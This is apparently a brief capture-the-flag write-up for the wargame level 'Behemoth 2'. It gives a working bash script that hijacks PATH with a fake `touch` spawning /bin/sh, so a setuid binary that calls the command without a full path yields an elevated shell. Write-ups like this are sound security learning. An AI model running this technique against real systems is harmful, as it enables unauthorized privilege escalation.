# Behemoth 2

ltrace shows that `touch` is called, not qualified. So the following script should work:

```bash
tmpdir=$(mktemp -d)
chmod 777 $tmpdir
cd $tmpdir
echo /bin/sh > touch
chmod 777 touch
export PATH=$tmpdir:$PATH
/behemoth/behemoth2
```